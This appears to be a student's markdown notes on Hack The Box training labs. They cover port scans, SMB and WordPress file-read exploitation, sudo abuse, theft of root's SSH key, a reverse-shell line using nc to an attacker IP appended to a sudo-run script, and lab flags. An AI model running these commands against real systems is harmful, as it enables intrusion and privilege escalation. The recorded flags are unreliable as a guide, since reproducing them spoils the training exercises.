
**Q1**
```
nmap -Pn --min-rate 5000 -T4 -p- 10.129.109.18
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-19 17:03 EDT
Nmap scan report for 10.129.109.18
Host is up (7.9s latency).
Not shown: 64352 filtered tcp ports (no-response), 1177 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 29.11 seconds
```

```
(root㉿kali)-[~/Desktop/HTB/sts]
└─# nmap -Pn -sV -sC -p 8080 10.129.109.18 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-19 17:18 EDT
Nmap scan report for 10.129.109.18
Host is up (1.0s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.48 seconds
```

**Q2**

```
root㉿kali)-[~/Desktop/HTB/sts]
└─# nmap -sV -p- -Pn 10.129.110.173
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-20 14:37 EDT
Nmap scan report for 10.129.110.173
Host is up (0.60s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2323/tcp open  telnet      Linux telnetd
8080/tcp open  http        Apache Tomcat
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3014.26 seconds
```

**Q3**

```
root㉿kali)-[~/Desktop/HTB/sts]
└─# smbclient -L \\\\10.129.110.222 -U bob
Password for [WORKGROUP\bob]:
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        users           Disk      
        IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.129.110.222 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

pass: Welcome1
```

```
smbclient \\\\10.129.110.222\\users -U bob

```

<img width="2128" height="1000" alt="image" src="https://github.com/user-attachments/assets/f9627a71-77d5-43dc-a428-80098594a187" />


```
(root㉿kali)-[~/Desktop/HTB/sts]
└─# cat flag.txt               
dceece590f3284c3866305eb2473d099

```

# Web Enumeration

```
gobuster dir -u http://154.57.164.72:32333 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

<img width="2132" height="1172" alt="image" src="https://github.com/user-attachments/assets/37b25299-cff8-4523-ad61-a4f8abcf943f" />

<img width="1734" height="1556" alt="image" src="https://github.com/user-attachments/assets/dc9a627b-e103-418f-b054-894bf3e98af8" />


<img width="1986" height="378" alt="image" src="https://github.com/user-attachments/assets/46038c8f-a12f-440f-ad22-50bd082f5740" />
<img width="1838" height="952" alt="image" src="https://github.com/user-attachments/assets/01e7a4bf-7c12-4f0d-8672-8a9da89c752b" />


<img width="1282" height="538" alt="image" src="https://github.com/user-attachments/assets/2f16dc45-4635-4f5b-963e-28d588d87198" />

<img width="1760" height="520" alt="image" src="https://github.com/user-attachments/assets/d1faaa05-c6d7-4dd3-8ad0-0776e30c25a9" />


# Public Exploits

```
(root㉿kali)-[~/Desktop/HTB/sts]
└─# nmap -A 154.57.164.81                             
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-21 13:47 EDT
Nmap scan report for 154-57-164-81.static.isp.htb.systems (154.57.164.81)
Host is up (0.13s latency).
Not shown: 913 filtered tcp ports (no-response), 86 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
53/tcp open  domain  Unbound
| dns-nsid: 
|   NSID: dac07 (6461633037)
|_  id.server: dac07
Aggressive OS guesses: Linux 3.0 (87%), HP P2000 G3 NAS device (87%), Android 5.0.1 (Linux 3.10) (87%), Amazon Fire TV (87%), QNAP QTS 5.0 (Linux 5.10) (87%), Linux 2.6.32 (87%), Linux 3.2 (87%), Linux 3.8 (87%), Linux 4.10 (87%), Android TV OS 11 (Linux 4.19) (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 15 hops

TRACEROUTE (using port 21571/tcp)
HOP RTT       ADDRESS
1   19.14 ms  192.168.0.1
2   3.45 ms   10.10.20.1
3   9.46 ms   192.168.192.57
4   42.16 ms  10.161.6.1
5   21.42 ms  10.56.86.73
6   ...
7   63.79 ms  157.119.185.48.summitiig.net (157.119.185.48)
8   ... 9
10  223.88 ms be4.core3.par2.he.net (184.104.193.5)
11  ...
12  223.92 ms be6.core2.ams2.he.net (184.104.197.186)
13  223.92 ms hack-the-box-ltd.e0-1.switch2.ams2.he.net (216.66.83.99)
14  196.77 ms 149.6.129.245
15  195.54 ms 154-57-164-81.static.isp.htb.systems (154.57.164.81)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.98 seconds
```

<img width="2402" height="926" alt="image" src="https://github.com/user-attachments/assets/b4136d8c-b14d-412d-8b71-6375734ca7e3" />


```
msf > search wordpress 2.7.10

Matching Modules
================

   #  Name                                               Disclosure Date  Rank    Check  Description
   -  ----                                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wp_simple_backup_file_read  .                normal  No     WordPress Simple Backup File Read Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read

msf > use auxiliary/scanner/http/wp_simple_backup_file_read
msf auxiliary(scanner/http/wp_simple_backup_file_read) > show options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4
                                         , socks5, socks5h, http, sapni
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-
                                         metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf auxiliary(scanner/http/wp_simple_backup_file_read) > set RHOST 154.57.164.81
RHOST => 154.57.164.81
msf auxiliary(scanner/http/wp_simple_backup_file_read) > set RPORT 30143
RPORT => 30143

msf auxiliary(scanner/http/wp_simple_backup_file_read) > set FILEPATH /flag.txt
FILEPATH => /flag.txt
msf auxiliary(scanner/http/wp_simple_backup_file_read) > exploit
[+] File saved in: /root/.msf4/loot/20260721141112_default_154.57.164.81_simplebackup.tra_114832.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/wp_simple_backup_file_read) > cat /root/.msf4/loot/20260721141112_default_154.57.164.81_simplebackup.tra_114832.txt


```

<img width="2650" height="1386" alt="image" src="https://github.com/user-attachments/assets/a6777bf6-57f2-4ef7-9caf-21c09a1b3ced" />


<img width="1632" height="184" alt="image" src="https://github.com/user-attachments/assets/3432f741-15ec-4022-9bcf-4de11b99573d" />


![[Pasted image 20260722001558.png]]

![[Pasted image 20260722001642.png]]

# Privilege Escalation

```
ssh user1@154.57.164.72 -p 31231
pass: password1
```

```
user1@ng-2596136-gettingstartedprivesc-46o7y-f477b88c4-6mll7:~$ whoami
user1
user1@ng-2596136-gettingstartedprivesc-46o7y-f477b88c4-6mll7:~$ sudo -l
Matching Defaults entries for user1 on ng-2596136-gettingstartedprivesc-46o7y-f477b88c4-6mll7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on ng-2596136-gettingstartedprivesc-46o7y-f477b88c4-6mll7:
    (user2 : user2) NOPASSWD: /bin/bash
user1@ng-2596136-gettingstartedprivesc-46o7y-f477b88c4-6mll7:~$ sudo -u user2 /bin/bash
user2@ng-2596136-gettingstartedprivesc-46o7y-f477b88c4-6mll7:/home/user1$ whoami
user2
user2@ng-2596136-gettingstartedprivesc-46o7y-f477b88c4-6mll7:/home/user1$ cd /home/user2/
user2@ng-2596136-gettingstartedprivesc-46o7y-f477b88c4-6mll7:~$ ls
flag.txt
user2@ng-2596136-gettingstartedprivesc-46o7y-f477b88c4-6mll7:~$ cat flag.txt
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}

```

![[Pasted image 20260722134536.png]]

```
cat /root/.ssh/id_rsa
```

![[Pasted image 20260722135217.png]]

```
nano id_rsa

chmod 600 id_rsa
```

```
ssh root@154.57.164.72 -p 31231 -i id_rsa
```

![[Pasted image 20260722135726.png]]

# Nibbles - Initial Foothold

```
(root㉿kali)-[~/Desktop/HTB/sts]
└─# gobuster dir -u http://10.129.22.158/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.22.158/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 308]
/.hta                 (Status: 403) [Size: 303]
/.htpasswd            (Status: 403) [Size: 308]
/README               (Status: 200) [Size: 4628]
/admin                (Status: 301) [Size: 325] [--> http://10.129.22.158/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 327] [--> http://10.129.22.158/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 329] [--> http://10.129.22.158/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 327] [--> http://10.129.22.158/nibbleblog/plugins/]
/themes               (Status: 301) [Size: 326] [--> http://10.129.22.158/nibbleblog/themes/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================

```

![[Pasted image 20260722174354.png]]

![[Pasted image 20260722174415.png]]

![[Pasted image 20260722174447.png]]


![[Pasted image 20260722183147.png]]


![[Pasted image 20260722174522.png]]

![[Pasted image 20260722181626.png]]

![[Pasted image 20260722184227.png]]

![[Pasted image 20260722184351.png]]

```
ls
personal.zip
user.txt
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
ls
personal
personal.zip
user.txt
cd personal
ls
stuff
cd stuff
ls
monitor.sh
cp monitor.sh monitor.sh.backup
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.73 8443 >/tmp/f' | tee -a monitor.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.73 8443 >/tmp/f
ls
monitor.sh
monitor.sh.backup
sudo ./monitor.sh
'unknown': I need something more specific.
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
rm: cannot remove '/tmp/f': No such file or directory

```



![[Pasted image 20260722185646.png]]



# Knowledge Check

```
                                                                                                                             
┌──(root㉿kali)-[~/Desktop/HTB/sts]
└─# nmap -sV -Pn 10.129.114.117   
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-22 09:44 EDT
Nmap scan report for 10.129.114.117
Host is up (0.94s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.96 seconds

```

![[Pasted image 20260722195451.png]]


![[Pasted image 20260722195404.png]]

![[Pasted image 20260722195531.png]]

![[Pasted image 20260722195759.png]]

```
cd /home
ls
mrb3n
cd mrb3n
ls
user.txt
cat user.txt
7002d65b149b0a4d19132a66feed21d8

```

```
CMD="/bin/sh"
sudo php -r "system('$CMD');"       
whoami
root
cd /root
ls
root.txt
snap
cat root.txt
f1fba6e9f71efb2630e6e34da6387842

```

![[Pasted image 20260722200325.png]]

![[Pasted image 20260722200357.png]]

